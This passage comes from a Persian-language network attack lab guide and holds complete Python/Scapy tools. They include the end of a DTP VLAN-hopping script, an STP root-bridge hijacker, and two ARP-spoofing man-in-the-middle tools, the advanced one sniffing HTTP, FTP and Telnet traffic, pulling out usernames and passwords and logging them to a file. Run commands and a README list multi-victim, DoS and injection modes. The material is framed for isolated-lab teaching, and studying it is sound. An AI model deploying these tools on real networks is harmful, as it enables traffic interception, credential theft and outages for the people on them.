            # اجرای کامل همه فازها
            attack.phase1_dtp_attack()
            attack.phase2_vlan_discovery()
            
            if not args.skip_dhcp:
                attack.phase3_dhcp_vlan_scan()
            
            if args.target_ip:
                attack.phase4_bidirectional_test(args.target_vlan, args.target_ip, args.duration)
            else:
                print("\n[!] برای فاز ۴، باید --target-ip را مشخص کنید")
                print("[*] مثال: --target-ip 192.168.10.1 --target-vlan 10")
        
    except KeyboardInterrupt:
        print("\n[!] حمله توسط کاربر متوقف شد")
    finally:
        attack.show_summary()

if __name__ == "__main__":
    main()
```
#### See Attack Result
1. **Laboratory Structure:**
```txt
[لپ‌تاپ مهاجم] ---> [سوییچ سیسکو] ---> [بقیه شبکه]
(Linux+Scapy)     (Port Gi0/5)      (VLAN 10,20,30...)
                  (Mode: dynamic auto)
```
2. **Switch Commands: Before Attack**
```sh Cisco
show interface gi0/5 switchport | include Mode
#Administrative Mode: dynamic auto
#Operational Mode: static access
```
3. **Switch Commands: After Attack**
```sh Cisco
show interface gi0/5 switchport | include Mode  
#Administrative Mode: dynamic auto  
#Operational Mode: trunk => نشانه حمله موفق
```
#### Monitoring(Teacher Notes)
1. **نمایش زنده با Wireshark:** یک اسنیف روی اینترفیس مهاجم باز کنید. بعد از موفقیت DTP، ترافیک همه VLANها را با تگ‌های مختلف نشان دهید.
2. **نمایش DHCP در VLAN های مختلف:** گرفتن IP از چند VLAN مختلف، اثبات قدرتمندی است.
3. **مقایسه قبل و بعد:** با `show interface trunk` قبل و بعد از حمله، تفاوت را نشان دهید.
4. **تأکید بر خطر پیش‌فرض:** به دانشجویان گوشزد کنید که تنظیمات پیش‌فرض (`dynamic auto`) چقدر خطرناک است.
### STP Attacks
#### STP Manipulation(STP Root Bridge Hijacking) - Simple Version
##### Code
```python
#!/usr/bin/env python3
"""
STP Root Bridge Hijacking - نسخه بسیار ساده آموزشی
هشدار: فقط در محیط آزمایشگاهی ایزوله!
"""

from scapy.all import *
import time

# آدرس Multicast مخصوص STP
STP_MULTICAST = "01:80:c2:00:00:00"

def become_root_bridge(iface="eth0", my_priority=0):
    """
    من Root Bridge می‌شوم!
    با Priority=0 از همه سوییچ‌ها پایینتر هستم
    """
    
    # ساخت BPDU جعلی با Priority خیلی پایین
    bpdu = (
        Dot3(dst=STP_MULTICAST, src=get_if_hwaddr(iface)) /  # لایه ۲ MAC
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /              # LLC header برای STP
        STP(
            proto=0,          # Protocol ID
            version=0,        # STP (802.1D)
            bpdutype=0x00,    # Configuration BPDU
            bpduflags=0x00,   # Normal
            rootid=my_priority,      # Root Priority = 0 (من Root هستم!)
            rootmac=get_if_hwaddr(iface),  # MAC من
            bridgeid=my_priority,   # Bridge Priority = 0
            bridgemac=get_if_hwaddr(iface),  # MAC من
            pathcost=0,       # من Root هستم، Cost صفر است
            portid=0x8001,    # Port ID
            age=0,            # Message Age
            maxage=20,        # Max Age
            hellotime=2,      # Hello Time
            forwarddelay=15   # Forward Delay
        )
    )
    
    print(f"[*] شروع حمله STP Root Hijacking روی {iface}")
    print(f"    Priority: {my_priority} (از همه پایینتر!)")
    print(f"    MAC مهاجم: {get_if_hwaddr(iface)}")
    print(f"    ارسال BPDU هر ۲ ثانیه...")
    
    # حلقه بی‌نهایت - ارسال BPDU هر ۲ ثانیه
    while True:
        sendp(bpdu, iface=iface, verbose=False)
        print(f"[+] BPDU جعلی ارسال شد (من Root هستم!) - {time.strftime('%H:%M:%S')}")
        time.sleep(2)

if __name__ == "__main__":
    # نمونه کد بسیار ساده - فقط در آزمایشگاه اجرا کنید!
    # become_root_bridge(iface="eth0", my_priority=0)
    
    print("=" * 50)
    print("حمله STP Manipulation - شبیه‌ساز آموزشی")
    print("=" * 50)
    print("برای اجرا:")
    print("  become_root_bridge(iface='eth0', my_priority=0)")
    print("")
    print("بررسی روی سوییچ:")
    print("  show spanning-tree root")
    print("  -> Root Bridge باید MAC مهاجم را نشان دهد!")
    
    # یکبار اجرا و نمایش بسته
    print("\n[*] نمایش ساختار یک بسته نمونه:")
    bpdu_sample = (
        Dot3(dst=STP_MULTICAST) / 
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / 
        STP(bridge_priority=0)
    )
    bpdu_sample.show()
```
##### Code Description
برای مشاهده حمله و اثبات کارایی کد ها، کافیست `spanning-tree` را در سوئیچ مشاهده کنیم:
1. **Before Attack:**
```sh Cisco
show spanning-tree root

#Output:
Root ID    Priority    32768 #Standard Priority Number is: 32768
           MAC Address    0000.0c00.1234 #Original MAC Addr
```
2. **After Attack:**
```sh Cisco
show spanning-tree root

#Output:
Root ID    Priority    0 => #0 mean attack implement successfully 
           MAC Address    aabb.ccdd.ee01  => #Attack MAC Address see in here
```
3. **Result:**
	- تمام ترافیک شبکه در بین VLAN ها از ماشین مهاجم عبور می‌کند. او می‌تواند:
	1. ترافیک را اسنیف کند (MITM)
	2. بعضی بسته‌ها را Drop کند (قطع ارتباط انتخابی)(DoS)
	3. تکرار Loops مصنوعی ایجاد کند (با ارسال متناقض BPDU)(DoS)
- 
### ARP Spoofing(Arp Cache Poisoning)
#### ARP Spoofing(Arp Cache Poisoning) - Advance Method
##### Codes
```python
#!/usr/bin/env python3
"""
ARP Spoofer - شبیه‌ساز آموزشی MITM
مدرس: فقط در محیط آزمایشگاهی ایزوله!

ایده اصلی:
- به قربانی بگوییم: "من گیت‌وی هستم" (IP گیت‌وی → MAC ما)
- به گیت‌وی بگوییم: "من قربانی هستم" (IP قربانی → MAC ما)
"""

from scapy.all import *
import time
import sys
import argparse

def get_mac(ip):
    """دریافت MAC واقعی یک IP (برای نمایش)"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].src
    return None

def enable_ip_forwarding():
    """فعال‌سازی Forwarding برای اینکه قربانی اینترنتش قطع نشود"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("[+] IP Forwarding فعال شد - قربانی اینترنت خواهد داشت")

def disable_ip_forwarding():
    """غیرفعال‌سازی Forwarding"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')

def arp_spoof(victim_ip, gateway_ip, iface, interval=2):
    """
    اجرای حمله ARP Spoofing
    
    پارامترها:
    - victim_ip: IP قربانی (مثلاً 192.168.1.10)
    - gateway_ip: IP گیت‌وی (مثلاً 192.168.1.1)
    - iface: اینترفیس مهاجم (مثلاً eth0)
    - interval: فاصله ارسال بسته‌ها (ثانیه)
    """
    
    # MAC خودمان
    my_mac = get_if_hwaddr(iface)
    
    # دریافت MAC واقعی قربانی و گیت‌وی (برای نمایش)
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    
    # ساخت بسته‌های ARP جعلی
    
    # ۱. به قربانی بگو: "من گیت‌وی هستم!"
    #    IP گیت‌وی روی MAC مهاجم
    poison_victim = ARP(
        op=2,              # 2 = ARP Reply (is-at)
        psrc=gateway_ip,   # IP مبدأ جعلی = IP گیت‌وی
        pdst=victim_ip,    # IP مقصد = IP قربانی
        hwdst=victim_mac,  # MAC مقصد = MAC واقعی قربانی
        hwsrc=my_mac       # MAC مبدأ = MAC ما (مهاجم)
    )
    
    # ۲. به گیت‌وی بگو: "من قربانی هستم!"
    #    IP قربانی روی MAC مهاجم
    poison_gateway = ARP(
        op=2,              # 2 = ARP Reply (is-at)
        psrc=victim_ip,    # IP مبدأ جعلی = IP قربانی
        pdst=gateway_ip,   # IP مقصد = IP گیت‌وی
        hwdst=gateway_mac, # MAC مقصد = MAC واقعی گیت‌وی
        hwsrc=my_mac       # MAC مبدأ = MAC ما (مهاجم)
    )
    
    print("=" * 60)
    print("🔥 ARP Spoofing Attack - MITM")
    print("=" * 60)
    print(f"مهاجم  : MAC={my_mac}")
    print(f"قربانی : IP={victim_ip}, MAC={victim_mac}")
    print(f"گیت‌وی : IP={gateway_ip}, MAC={gateway_mac}")
    print("-" * 60)
    print("📦 بسته‌های ARP جعلی:")
    print(f"   → به قربانی: {gateway_ip} is at {my_mac}")
    print(f"   → به گیت‌وی: {victim_ip} is at {my_mac}")
    print("=" * 60)
    
    # فعال‌سازی IP Forwarding (برای MITM شفاف)
    enable_ip_forwarding()
    
    print("\n[*] حمله شروع شد! (Ctrl+C برای توقف)")
    print("[*] هر {} ثانیه بسته‌های ARP ارسال می‌شوند\n".format(interval))
    
    try:
        packet_count = 0
        while True:
            # ارسال بسته‌های مسموم
            send(poison_victim, iface=iface, verbose=0)
            send(poison_gateway, iface=iface, verbose=0)
            packet_count += 2
            
            print(f"\r[+] بسته‌های {packet_count} ارسال شد | "
                  f"قربانی: {victim_ip} ←→ مهاجم ←→ گیت‌وی: {gateway_ip}", 
                  end="", flush=True)
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n\n[!] توقف حمله...")
        restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac, iface)
        disable_ip_forwarding()
        print("[+] همه چیز به حالت عادی برگشت")

def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac, iface):
    """بازگرداندن جداول ARP به حالت واقعی"""
    print("[*] بازگرداندن جداول ARP...")
    
    # به قربانی: MAC واقعی گیت‌وی را بده
    restore_victim = ARP(
        op=2,
        psrc=gateway_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=gateway_mac
    )
    
    # به گیت‌وی: MAC واقعی قربانی را بده
    restore_gateway = ARP(
        op=2,
        psrc=victim_ip,
        pdst=gateway_ip,
        hwdst=gateway_mac,
        hwsrc=victim_mac
    )
    
    # ۵ بار ارسال برای اطمینان
    for _ in range(5):
        send(restore_victim, iface=iface, verbose=0)
        send(restore_gateway, iface=iface, verbose=0)
        time.sleep(0.5)
    
    print("[+] جداول ARP بازگردانده شدند")


# ============================================================
# نسخه فوق‌العاده ساده برای تدریس (۳ خط اصلی!)
# ============================================================

def simple_arp_spoofer(victim_ip, gateway_ip, iface="eth0"):
    """
    نسخه مینیمال - فقط ۳ خط کد اصلی!
    مناسب برای نشان دادن مفهوم حمله
    """
    my_mac = get_if_hwaddr(iface)
    
    # بسته جعلی به قربانی: IP گیت‌وی = MAC من
    pkt1 = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=my_mac)
    
    # بسته جعلی به گیت‌وی: IP قربانی = MAC من
    pkt2 = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=my_mac)
    
    print(f"🔥 ARP Spoof: {victim_ip} ←→ مهاجم ←→ {gateway_ip}")
    print("[*] Ctrl+C برای توقف")
    
    while True:
        send(pkt1, verbose=0)
        send(pkt2, verbose=0)
        time.sleep(2)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ARP Spoofer - ابزار آموزشی')
    parser.add_argument('-v', '--victim', required=True, help='IP قربانی')
    parser.add_argument('-g', '--gateway', required=True, help='IP گیت‌وی')
    parser.add_argument('-i', '--iface', default='eth0', help='اینترفیس مهاجم')
    parser.add_argument('--simple', action='store_true', 
                       help='استفاده از نسخه ساده‌تر')
    
    args = parser.parse_args()
    
    if args.simple:
        simple_arp_spoofer(args.victim, args.gateway, args.iface)
    else:
        arp_spoof(args.victim, args.gateway, args.iface)
```
##### Running Method
1. **Running Python Script:**
```sh
#نسخه کامل (با نمایش جزئیات)
sudo python3 arp_spoofer.py -v 192.168.1.10 -g 192.168.1.1 -i eth0

#نسخه ساده (فقط ۳ خط اصلی)
sudo python3 arp_spoofer.py -v 192.168.1.10 -g 192.168.1.1 --simple
```
2. **Proof of Concept:**
- 2.1. **Before Attack:**
```sh
Victim ←→ Gateway (Direct)
192.168.1.10 → aa:bb:cc:dd:ee:ff
```
- 2.2. **When Attack is Running:**
```sh
Victim ←→ Attacker ←→ Gateway
192.168.1.10 → 66:77:88:99:aa:bb (مک مهاجم به جای گیت‌وی)
192.168.1.1  → 66:77:88:99:aa:bb (مک مهاجم به جای قربانی)
```
#### ARP Spoofing(Arp Cache Poisoning) - More Advance Method
##### Full Codes
- **Features:**
	1. پیاده سازی MITM شفاف با IP Forwarding خودکار
	2. بازیابی خودکار ARP در خروج(برگشتن به حالت عادی)
	3. اسنیفینگ ترافیک و استخراج اطلاعات
	4. پشتیبانی از چندین قربانی همزمان
	5. قابلیت تزریق محتوا (مدرن و کاربردی)
	6. ذخیره‌سازی PCAP
```python
#!/usr/bin/env python3
"""
ARP Spoofer پیشرفته - نسخه حرفه‌ای آموزشی
قابلیت‌ها:
- MITM شفاف با IP Forwarding خودکار
- بازیابی خودکار ARP در خروج
- اسنیفینگ ترافیک و استخراج اطلاعات
- پشتیبانی از چندین قربانی همزمان
- قابلیت تزریق محتوا (مدرن و کاربردی)
- ذخیره‌سازی PCAP
"""

from scapy.all import *
import time
import sys
import signal
import threading
import argparse
from collections import defaultdict
import re

# رنگ‌های ترمینال
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'

class AdvancedARPSpoofer:
    def __init__(self, targets, gateway, iface, interval=2, 
                 sniffer_enabled=True, capture_file=None, inject_enabled=False):
        """
        ARP Spoofer پیشرفته
        
        پارامترها:
        - targets: لیست IPهای قربانی
        - gateway: IP گیت‌وی
        - iface: اینترفیس مهاجم
        - interval: فاصله ارسال ARP Poison
        - sniffer_enabled: فعال‌سازی اسنیفینگ
        - capture_file: فایل PCAP برای ذخیره
        - inject_enabled: تزریق محتوا
        """
        self.targets = targets if isinstance(targets, list) else [targets]
        self.gateway = gateway
        self.iface = iface
        self.interval = interval
        self.sniffer_enabled = sniffer_enabled
        self.capture_file = capture_file
        self.inject_enabled = inject_enabled
        
        self.my_mac = get_if_hwaddr(iface)
        self.my_ip = get_if_addr(iface)
        
        # ذخیره MACهای واقعی
        self.real_macs = {}
        
        # آمار
        self.stats = {
            'arp_sent': 0,
            'packets_sniffed': 0,
            'http_requests': 0,
            'passwords_captured': 0
        }
        
        # بانک اطلاعاتی کاربران دزدیده شده
        self.captured_credentials = []
        
        # Threadهای فعال
        self.running = True
        self.threads = []
        
        # سیگنال خروج
        signal.signal(signal.SIGINT, self.exit_handler)
        signal.signal(signal.SIGTERM, self.exit_handler)
    
    def get_target_mac(self, ip):
        """دریافت MAC واقعی یک IP"""
        if ip in self.real_macs:
            return self.real_macs[ip]
        
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, iface=self.iface, verbose=0
        )
        if ans:
            mac = ans[0][1].src
            self.real_macs[ip] = mac
            return mac
        return None
    
    def enable_ip_forwarding(self):
        """فعال/غیرفعال کردن IP Forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            return True
        except:
            return False
    
    def disable_ip_forwarding(self):
        """غیرفعال کردن IP Forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
        except:
            pass
    
    def create_poison_packets(self):
        """ساخت بسته‌های ARP Poison برای همه قربانی‌ها"""
        packets = []
        
        for target in self.targets:
            target_mac = self.get_target_mac(target)
            if not target_mac:
                print(f"{Colors.RED}[-] نمی‌توانم MAC {target} را پیدا کنم!{Colors.END}")
                continue
            
            # بسته به قربانی: IP گیت‌وی روی MAC مهاجم
            pkt_to_target = Ether(
                src=self.my_mac,
                dst=target_mac
            ) / ARP(
                op=2,              # ARP Reply
                psrc=self.gateway,  # IP گیتوی
                pdst=target,       # IP قربانی
                hwdst=target_mac,  # MAC قربانی
                hwsrc=self.my_mac  # MAC مهاجم (جعلی)
            )
            packets.append(pkt_to_target)
        
        # بسته به گیت‌وی: IPهای قربانی روی MAC مهاجم
        gateway_mac = self.get_target_mac(self.gateway)
        if gateway_mac:
            for target in self.targets:
                target_mac = self.get_target_mac(target)
                if not target_mac:
                    continue
                
                pkt_to_gateway = Ether(
                    src=self.my_mac,
                    dst=gateway_mac
                ) / ARP(
                    op=2,              # ARP Reply
                    psrc=target,       # IP قربانی
                    pdst=self.gateway,  # IP گیت‌وی
                    hwdst=gateway_mac,  # MAC گیت‌وی
                    hwsrc=self.my_mac  # MAC مهاجم (جعلی)
                )
                packets.append(pkt_to_gateway)
        
        return packets
    
    def arp_poison_loop(self):
        """حلقه اصلی ARP Poisoning"""
        print(f"\n{Colors.GREEN}[+] حلقه ARP Poisoning شروع شد{Colors.END}")
        
        while self.running:
            packets = self.create_poison_packets()
            for pkt in packets:
                sendp(pkt, iface=self.iface, verbose=0)
                self.stats['arp_sent'] += 1
            
            # نمایش آمار زنده
            self.print_live_stats()
            time.sleep(self.interval)
    
    def packet_sniffer(self):
        """اسنیفینگ ترافیک عبوری"""
        if not self.sniffer_enabled:
            return
        
        print(f"{Colors.GREEN}[+] اسنیفینگ ترافیک شروع شد{Colors.END}")
        
        # ساخت BPF Filter برای هدف‌ها
        target_ips = ' or '.join([f'host {t}' for t in self.targets])
        bpf_filter = f'({target_ips}) and not arp'
        
        # شروع اسنیفینگ
        sniff(
            iface=self.iface,
            prn=self.process_packet,
            filter=bpf_filter,
            store=False,
            stop_filter=lambda x: not self.running
        )
    
    def process_packet(self, pkt):
        """پردازش هر بسته رهگیری شده"""
        self.stats['packets_sniffed'] += 1
        
        if IP not in pkt:
            return
        
        src = pkt[IP].src
        dst = pkt[IP].dst
        
        # ذخیره در PCAP اگر خواسته باشیم
        if self.capture_file:
            wrpcap(self.capture_file, pkt, append=True)
        
        # تشخیص HTTP
        if TCP in pkt and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80):
            self.analyze_http(pkt)
        
        # تشخیص پروتکل‌های حساس
        self.detect_sensitive_protocol(pkt)
    
    def analyze_http(self, pkt):
        """استخراج اطلاعات از HTTP"""
        if Raw in pkt:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # HTTP Request
            if 'Host: ' in payload:
                self.stats['http_requests'] += 1
                host = re.search(r'Host: (.+?)\r\n', payload)
                url = re.search(r'(GET|POST) (.+?) HTTP', payload)
                if host and url:
                    print(f"\n{Colors.CYAN}[HTTP] {url.group(1)} {host.group(1)}{url.group(2)}{Colors.END}")
            
            # استخراج لاگین (POST data)
            if 'password' in payload.lower() or 'user' in payload.lower():
                self.extract_credentials(pkt, payload)
    
    def extract_credentials(self, pkt, payload):
        """استخراج اطلاعات کاربری"""
        src = pkt[IP].src
        dst = pkt[IP].dst
        
        # جستجوی الگوهای لاگین
        username = re.search(r'(?:user(?:name)?|login|email)=(.*?)(?:&|$)', payload, re.I)
        password = re.search(r'(?:pass(?:word)?|passwd)=(.*?)(?:&|$)', payload, re.I)
        
        if username or password:
            self.stats['passwords_captured'] += 1
            cred = {
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'src': src,
                'dst': dst,
                'username': username.group(1) if username else 'Unknown',
                'password': password.group(1) if password else 'Unknown',
                'raw_payload': payload[:200]
            }
            self.captured_credentials.append(cred)
            
            print(f"\n{Colors.RED}╔══════════════════════════════════╗")
            print(f"║ 🎯 اطلاعات کاربری دزدیده شد!      ║")
            print(f"╠══════════════════════════════════╣")
            print(f"║ از IP: {src:<25} ║")
            print(f"║ به IP: {dst:<25} ║")
            print(f"║ کاربر: {cred['username']:<24} ║")
            print(f"║ رمز:   {cred['password']:<24} ║")
            print(f"╚══════════════════════════════════╝{Colors.END}")
            
            # ذخیره در فایل
            with open('captured_credentials.txt', 'a') as f:
                f.write(f"[{cred['timestamp']}] {cred['src']} -> {cred['dst']} | "
                       f"User: {cred['username']} | Pass: {cred['password']}\n")
    
    def detect_sensitive_protocol(self, pkt):
        """تشخیص پروتکل‌های حساس مثل FTP, Telnet"""
        if TCP in pkt:
            ports = {21: 'FTP', 23: 'Telnet', 110: 'POP3', 143: 'IMAP'}
            for port, proto in ports.items():
                if pkt[TCP].dport == port or pkt[TCP].sport == port:
                    if Raw in pkt:
                        data = pkt[Raw].load.decode('utf-8', errors='ignore')[:100]
                        print(f"\n{Colors.YELLOW}[{proto}] {data}{Colors.END}")
    
    def content_injector(self):
        """تزریق محتوا به ترافیک HTTP (پیشرفته)"""
        if not self.inject_enabled:
            return
        
        # این بخش فقط برای نمایش قابلیت است
        # در عمل نیاز به iptables NFQUEUE و netfilter دارد
        print(f"{Colors.YELLOW}[*] تزریق محتوا فعال است (نیاز به تنظیم iptables دارد){Colors.END}")
    
    def print_live_stats(self):
        """نمایش آمار زنده"""
        sys.stdout.write(f"\r{Colors.GREEN}[+] ARP Sent: {self.stats['arp_sent']} | "
                        f"Packets: {self.stats['packets_sniffed']} | "
                        f"HTTP: {self.stats['http_requests']} | "
                        f"PWNED: {self.stats['passwords_captured']}{Colors.END}")
        sys.stdout.flush()
    
    def restore_arp(self):
        """بازگرداندن جداول ARP"""
        print(f"\n\n{Colors.YELLOW}[*] بازگرداندن جداول ARP...{Colors.END}")
        
        gateway_mac = self.real_macs.get(self.gateway)
        if not gateway_mac:
            gateway_mac = self.get_target_mac(self.gateway)
        
        for target in self.targets:
            target_mac = self.real_macs.get(target)
            if not target_mac:
                target_mac = self.get_target_mac(target)
            if not target_mac or not gateway_mac:
                continue
            
            # بازگردانی قربانی
            restore_target = Ether(
                src=gateway_mac,
                dst=target_mac
            ) / ARP(
                op=2,
                psrc=self.gateway,
                pdst=target,
                hwdst=target_mac,
                hwsrc=gateway_mac
            )
            
            # بازگردانی گیت‌وی
            restore_gateway = Ether(
                src=target_mac,
                dst=gateway_mac
            ) / ARP(
                op=2,
                psrc=target,
                pdst=self.gateway,
                hwdst=gateway_mac,
                hwsrc=target_mac
            )
            
            for _ in range(5):
                sendp(restore_target, iface=self.iface, verbose=0)
                sendp(restore_gateway, iface=self.iface, verbose=0)
                time.sleep(0.5)
        
        print(f"{Colors.GREEN}[+] جداول ARP بازگردانده شدند{Colors.END}")
    
    def start(self):
        """شروع حمله"""
        self.print_banner()
        
        # دریافت MACها
        print(f"\n{Colors.BLUE}[*] در حال دریافت MACهای واقعی...{Colors.END}")
        for target in self.targets:
            mac = self.get_target_mac(target)
            print(f"    {target} → {mac}")
        gw_mac = self.get_target_mac(self.gateway)
        print(f"    {self.gateway} → {gw_mac} (گیت‌وی)")
        
        # فعال‌سازی Forwarding
        if self.enable_ip_forwarding():
            print(f"\n{Colors.GREEN}[+] IP Forwarding فعال شد (MITM شفاف){Colors.END}")
        
        # شروع Threadها
        # ۱. ARP Poison Loop
        t_arp = threading.Thread(target=self.arp_poison_loop)
        t_arp.daemon = True
        t_arp.start()
        self.threads.append(t_arp)
        
        # ۲. Packet Sniffer
        if self.sniffer_enabled:
            t_sniffer = threading.Thread(target=self.packet_sniffer)
            t_sniffer.daemon = True
            t_sniffer.start()
            self.threads.append(t_sniffer)
        
        # ۳. Content Injector
        if self.inject_enabled:
            t_inject = threading.Thread(target=self.content_injector)
            t_inject.daemon = True
            t_inject.start()
            self.threads.append(t_inject)
        
        # منتظر بمون
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    
    def exit_handler(self, signum, frame):
        """مدیریت خروج"""
        print(f"\n\n{Colors.RED}[!] در حال خروج امن...{Colors.END}")
        self.running = False
        self.restore_arp()
        self.disable_ip_forwarding()
        self.print_summary()
        sys.exit(0)
    
    def print_banner(self):
        """نمایش بنر"""
        banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════╗
║   ARP Spoofer Professional - امنیت آموزشی            ║
║   نسخه پیشرفته با MITM کامل                          ║
╚══════════════════════════════════════════════════════╝{Colors.END}
{Colors.CYAN}[+] اهداف: {', '.join(self.targets)}
[+] گیت‌وی: {self.gateway}
[+] اینترفیس: {self.iface}
[+] MAC مهاجم: {self.my_mac}
[+] فاصله ARP: {self.interval} ثانیه
[+] اسنیفینگ: {'فعال' if self.sniffer_enabled else 'غیرفعال'}
[+] فایل PCAP: {self.capture_file or 'غیرفعال'}{Colors.END}
"""
        print(banner)
    
    def print_summary(self):
        """خلاصه نهایی حمله"""
        print(f"""
{Colors.GREEN}╔══════════════════════════════════════╗
║   📊 خلاصه حمله ARP Spoofing        ║
╠══════════════════════════════════════╣
║ بسته‌های ARP ارسالی: {self.stats['arp_sent']:<13} ║
║ بسته‌های رهگیری شده: {self.stats['packets_sniffed']:<13} ║
║ درخواست‌های HTTP:    {self.stats['http_requests']:<13} ║
║ اطلاعات دزدیده شده:  {self.stats['passwords_captured']:<13} ║
╚══════════════════════════════════════╝{Colors.END}
""")
        if self.captured_credentials:
            print(f"{Colors.RED}[+] اطلاعات دزدیده شده در captured_credentials.txt ذخیره شد{Colors.END}")

# ============================================================
# تابع ساده برای استفاده آسان
# ============================================================

def simple_spoof(target, gateway, iface="eth0"):
    """نسخه ساده‌تر"""
    spoofer = AdvancedARPSpoofer(
        targets=target,
        gateway=gateway,
        iface=iface,
        sniffer_enabled=True
    )
    spoofer.start()


# ============================================================
# اجرای اصلی
# ============================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ARP Spoofer پیشرفته')
    parser.add_argument('-t', '--targets', nargs='+', required=True, help='IP قربانی(ها)')
    parser.add_argument('-g', '--gateway', required=True, help='IP گیت‌وی')
    parser.add_argument('-i', '--iface', default='eth0', help='اینترفیس')
    parser.add_argument('--interval', type=float, default=2, help='فاصله ARP')
    parser.add_argument('--no-sniff', action='store_true', help='غیرفعال کردن اسنیفینگ')
    parser.add_argument('--pcap', help='ذخیره ترافیک در فایل PCAP')
    parser.add_argument('--inject', action='store_true', help='فعال کردن تزریق محتوا')
    parser.add_argument('--simple', action='store_true', help='اجرای نسخه ساده')
    
    args = parser.parse_args()
    
    if args.simple:
        simple_spoof(args.targets, args.gateway, args.iface)
    else:
        spoofer = AdvancedARPSpoofer(
            targets=args.targets,
            gateway=args.gateway,
            iface=args.iface,
            interval=args.interval,
            sniffer_enabled=not args.no_sniff,
            capture_file=args.pcap,
            inject_enabled=args.inject
        )
        spoofer.start()
```
##### Running Methods
```sh
#تست ساده: قطع و وصل اینترنت قربانی لحظه‌ای
#Simple Test: Connect/Disconnet Victim Internet in Real Time
sudo python3 arp_spoofer.py -t 192.168.1.5 -g 192.168.1.1 --simple

#حمله کامل: ضبط همه رمزهای HTTP
#Full Attack: Record All HTTP Passwords
sudo python3 arp_spoofer.py -t 192.168.1.5 -g 192.168.1.1

#تحقیق: ضبط ترافیک برای تحلیل
#Research: Record Network Traffic for Analysing
sudo python3 arp_spoofer.py -t 192.168.1.5 -g 192.168.1.1 --pcap evidence.pcap

#شبکه بزرگ: سه قربانی + پویزن سریع
#Big Scale Network: 3 Victim + Fats Poisoning
: سع قربانی + پوی سریع
sudo python3 arp_spoofer.py -t 192.168.1.5 192.168.1.6 192.168.1.7 -g 192.168.1.1 --interval 0.3
```
##### README - Full
```md
#!/bin/bash
# ============================================================
# 📖 راهنمای کامل ARP Spoofer پیشرفته
# ============================================================

# ----------------------------------------
# 🟢 حالت ۱: اجرای نسخه ساده (فقط ARP Poison)
# ----------------------------------------
# مناسب: آموزش سریع، تست اولیه
sudo python3 arp_spoofer.py \
    -t 192.168.1.10 \
    -g 192.168.1.1 \
    --simple

# ----------------------------------------
# 🟡 حالت ۲: نسخه کامل با اسنیفینگ
# ----------------------------------------
# مناسب: دزدیدن اطلاعات کاربری HTTP
sudo python3 arp_spoofer.py \
    -t 192.168.1.10 \
    -g 192.168.1.1 \
    -i eth0

# ویژگی‌های پیش‌فرض:
# ✅ ARP Poisoning هر ۲ ثانیه
# ✅ اسنیفینگ HTTP (تشخیص لاگین و رمز)
# ✅ نمایش زنده آمار
# ✅ ذخیره خودکار رمزها در captured_credentials.txt
# ✅ بازیابی خودکار ARP در خروج

# ----------------------------------------
# 🟠 حالت ۳: چند قربانی همزمان
# ----------------------------------------
sudo python3 arp_spoofer.py \
    -t 192.168.1.10 192.168.1.20 192.168.1.30 \
    -g 192.168.1.1

# ----------------------------------------
# 🔴 حالت ۴: ذخیره ترافیک در PCAP
# ----------------------------------------
# مناسب: تحلیل بعد از حمله با Wireshark
sudo python3 arp_spoofer.py \
    -t 192.168.1.10 \
    -g 192.168.1.1 \
    --pcap /tmp/capture.pcap

# تحلیل PCAP:
wireshark /tmp/capture.pcap
# فیلتر در Wireshark: http.request.method == "POST"

# ----------------------------------------
# 🟣 حالت ۵: بدون اسنیفینگ (فقط قطع ارتباط)
# ----------------------------------------
# مناسب: DoS، آفلاین کردن قربانی
sudo python3 arp_spoofer.py \
    -t 192.168.1.10 \
    -g 192.168.1.1 \
    --no-sniff

# ----------------------------------------
# 🔵 حالت ۶: افزایش سرعت Poisoning
# ----------------------------------------
# مناسب: شبکه شلوغ برای اطمینان از مسمومیت
sudo python3 arp_spoofer.py \
    -t 192.168.1.10 \
    -g 192.168.1.1 \
    --interval 0.5  # هر نیم ثانیه!

# ----------------------------------------
# ⚫ حالت ۷: حالت تزریق محتوا
# ----------------------------------------
# نیاز به تنظیم اضافه iptables دارد
sudo python3 arp_spoofer.py \
    -t 192.168.1.10 \
    -g 192.168.1.1 \
    --inject

# ============================================================
# 📊 نمونه خروجی در حین اجرا
# ============================================================
# ╔══════════════════════════════════════════════════════╗
# ║   ARP Spoofer Professional - امنیت آموزشی            ║
# ╚══════════════════════════════════════════════════════╝
# [+] اهداف: 192.168.1.10
# [+] گیت‌وی: 192.168.1.1
# [+] MAC مهاجم: 00:0c:29:ab:cd:ef
# [+] ARP Sent: 142 | Packets: 89 | HTTP: 12 | PWNED: 3

# ============================================================
# 🛑 خروج امن (Ctrl+C)
# ============================================================
# به طور خودکار:
# ۱. جداول ARP بازگردانی می‌شوند
